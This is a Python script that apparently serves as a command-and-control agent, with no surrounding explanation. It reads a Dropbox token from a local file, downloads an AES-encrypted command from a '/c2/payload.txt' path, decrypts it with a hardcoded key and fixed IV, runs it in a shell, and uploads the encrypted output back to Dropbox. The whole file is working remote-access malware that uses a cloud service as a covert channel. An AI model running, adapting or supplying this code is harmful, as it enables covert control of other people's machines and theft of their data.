import dropbox
import subprocess
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

key = "564cybereffectss".encode()
CONST_IV = 'qwertyuiopasdfgh'.encode()

def encrypt_message(message):
    cipher = AES.new(key, AES.MODE_CBC, IV=CONST_IV)
    ct_bytes = cipher.encrypt(pad(message, AES.block_size))
    return ct_bytes

def decrypt_message(ct_bytes):
    cipher = AES.new(key, AES.MODE_CBC, iv=CONST_IV)
    pt = unpad(cipher.decrypt(ct_bytes), AES.block_size)
    return pt.decode()

with open("token.txt", "r") as f:
    token = f.read()


dbx = dropbox.Dropbox(token)


dropbox_path = '/c2/payload.txt'

def read_command():
    _, response = dbx.files_download(dropbox_path)
    command = decrypt_message(response.content)
    print('[+] Successfully read command from payload.txt')
    print(f'command form c2->{command}')
    excecute(command)



def excecute(command):
    command = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = command.stdout.read() + command.stderr.read()

    print(f'output->{output}')
    write_output(output)



def write_output(output):
    output = encrypt_message(output)
    dbx.files_upload(output, dropbox_path, mode=dropbox.files.WriteMode("overwrite"))
    print("Response written to payload.txt.")

read_command()
